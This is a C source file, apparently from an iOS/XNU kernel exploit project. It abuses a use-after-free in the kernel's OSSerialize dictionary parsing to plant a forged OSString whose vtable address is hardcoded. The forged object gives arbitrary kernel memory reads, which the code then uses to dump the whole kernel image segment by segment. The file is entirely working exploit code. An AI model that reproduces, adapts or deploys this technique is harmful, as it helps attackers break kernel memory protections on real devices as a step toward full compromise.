#include <errno.h>              // errno
#include <stddef.h>             // size_t
#include <stdint.h>             // uint32_t
#include <stdlib.h>             // malloc
#include <string.h>             // memset, strerror

#include "common.h"             // ASSERT, DEBUG, ERROR, PRINT_BUF, ADDR, addr_t, MACH_MAGIC, mach_hdr_t, mach_seg_t
#include "io.h"                 // MIG_MSG_SIZE, kOS*, OSString, dict_get_bytes
#include "slide.h"              // get_kernel_slide

#include "uaf_read.h"

void uaf_get_bytes(const OSString *fake, char *buf, size_t len)
{
    DEBUG("Using UAF to read kernel bytes...");

    const uint32_t *data = (const uint32_t*)fake;
    PRINT_BUF("Data", data, sizeof(OSString));

    uint32_t buflen = (uint32_t)len;
    const char str[4] = "str",
               ref[4] = "ref",
               sav[4] = "sav";
    uint32_t dict[11 + sizeof(OSString) / sizeof(uint32_t)] =
    {
        kOSSerializeMagic,                                              // Magic
        kOSSerializeEndCollection | kOSSerializeDictionary | 6,         // Dictionary with 6 entries

        kOSSerializeString | 4,                                         // String that will get freed
        *((uint32_t*)str),
        kOSSerializeData | sizeof(OSString),                            // OSData with same size as OSString
#ifdef __LP64__
        data[0],                                                        // vtable pointer (lower half)
        data[1],                                                        // vtable pointer (upper half)
        data[2],                                                        // retainCount
        data[3],                                                        // flags
        data[4],                                                        // length
        data[5],                                                        // (padding)
        data[6],                                                        // string pointer (lower half)
        data[7],                                                        // string pointer (upper half)
#else
        data[0],                                                        // vtable pointer
        data[1],                                                        // retainCount
        data[2],                                                        // flags
        data[3],                                                        // length
        data[4],                                                        // string pointer
#endif

        kOSSerializeSymbol | 4,                                         // Name that we're gonne use to retrieve bytes
        *((uint32_t*)ref),
        kOSSerializeObject | 1,                                         // Reference to the overwritten OSString

        kOSSerializeSymbol | 4,                                         // Create a reference to the OSData to prevent it
        *((uint32_t*)sav),                                              // from being freed before the OSString, which
        kOSSerializeEndCollection | kOSSerializeObject | 2,             // would cause a panic (because heap poisoning).
    };
    PRINT_BUF("Dict", dict, sizeof(dict));

/*    uint32_t *buf = malloc(bufsize);
    if(buf == NULL)
    {
        ERROR("Failed to allocate buffer (%s)", strerror(errno));
    }*/

    dict_get_bytes(dict, sizeof(dict), ref, buf, &buflen);

    PRINT_BUF("Fetched bytes", (uint32_t*)buf, buflen);

    //free(buf);
}

void uaf_read(const char *addr, char *buf, size_t len)
{
    DEBUG("Dumping kernel bytes " ADDR "-" ADDR "...", (addr_t)addr, (addr_t)(addr + len));

    size_t kslide = get_kernel_slide();
    OSString osstr =
    {
        .vtab = (void*)(0xffffff80044ef1f0 + kslide),   // TODO: hardcoded
        .retainCount = 100,                             // don't try to free this
        .flags = kOSStringNoCopy,                       // and neither the "string" it points to
    };

    for(size_t off = 0; off < len; off += osstr.length)
    {
        osstr.length = len - off;
        osstr.length = osstr.length > MIG_MSG_SIZE ? MIG_MSG_SIZE : osstr.length;
        osstr.string = (const char*)addr + off;
        //DEBUG(ADDR " %08x", (addr_t)osstr.string, osstr.length);
        //verbose = false;
        uaf_get_bytes(&osstr, buf, osstr.length);
        //verbose = true;
    }
}

file_t uaf_dump_kernel()
{
    DEBUG("Dumping kernel...");

    char *hbuf = malloc(MIG_MSG_SIZE),
         *newhbuf = malloc(MIG_MSG_SIZE);
    if(hbuf == NULL || newhbuf == NULL)
    {
        ERROR("Failed to allocate buffer (%s)", strerror(errno));
    }
    memset(newhbuf, 0, MIG_MSG_SIZE);

    char *kbase = (char*)(0xffffff8004004000 + get_kernel_slide());
    uaf_read(kbase, hbuf, MIG_MSG_SIZE);
    PRINT_BUF("Kernel header", (uint32_t*)hbuf, MIG_MSG_SIZE);

    mach_hdr_t *hdr = (mach_hdr_t*)hbuf;
    ASSERT(MACH_MAGIC == hdr->magic);
    memcpy(newhbuf, hbuf, sizeof(*hdr));
    mach_hdr_t *newhdr = (mach_hdr_t*)newhbuf;
    newhdr->ncmds = 0;
    newhdr->sizeofcmds = 0;

    size_t filesize = 0;
    for(mach_cmd_t *cmd = (mach_cmd_t*)&hdr[1], *end = (mach_cmd_t*)((char*)cmd + hdr->sizeofcmds); cmd < end; cmd = (mach_cmd_t*)((char*)cmd + cmd->cmdsize))
    {
        switch(cmd->cmd)
        {
            case LC_SEGMENT:
            case LC_SEGMENT_64:
                {
                    mach_seg_t *seg = (mach_seg_t*)cmd;
                    size_t size = seg->fileoff + seg->filesize;
                    filesize = size > filesize ? size : filesize;
                }
                break;
        }
    }

    char *buf = malloc(filesize);
    if(buf == NULL)
    {
        ERROR("Failed to allocate buffer (%s)", strerror(errno));
    }

    //verbose = false;
    for(mach_cmd_t *cmd = (mach_cmd_t*)&hdr[1], *end = (mach_cmd_t*)((char*)cmd + hdr->sizeofcmds); cmd < end; cmd = (mach_cmd_t*)((char*)cmd + cmd->cmdsize))
    {
        switch(cmd->cmd)
        {
            case LC_SEGMENT:
            case LC_SEGMENT_64:
                {
                    mach_seg_t *seg = (mach_seg_t*)cmd;
                    if((seg->flags & SG_NORELOC) != 0)
                    {
                        DEBUG("Skipping %s...", seg->segname);
                        break;
                    }
                    DEBUG("%-16s vmaddr: " ADDR " vmsize: " ADDR " fileoff: " ADDR " filesize: " ADDR, seg->segname, seg->vmaddr, seg->vmsize, (addr_t)(kbase + seg->fileoff), seg->filesize);
                    uaf_read((char*)seg->vmaddr, &buf[seg->fileoff], seg->filesize);
                    //uaf_read(kbase + seg->fileoff, &buf[seg->fileoff], seg->filesize);
                }
            case LC_UUID:
            case LC_UNIXTHREAD:
            case LC_VERSION_MIN_IPHONEOS:
            case LC_FUNCTION_STARTS:
            case LC_SOURCE_VERSION:
                memcpy(newhbuf + sizeof(*hdr) + newhdr->sizeofcmds, cmd, cmd->cmdsize);
                newhdr->sizeofcmds += cmd->cmdsize;
                newhdr->ncmds++;
                break;
        }
    }
    //verbose = true;

    memcpy(buf, newhbuf, sizeof(*hdr) + hdr->sizeofcmds);

    //uaf_read(kbase, buf, len);
    free(hbuf);
    free(newhbuf);

    return (file_t) {
        .buf = buf,
        .len = filesize,
    };
}
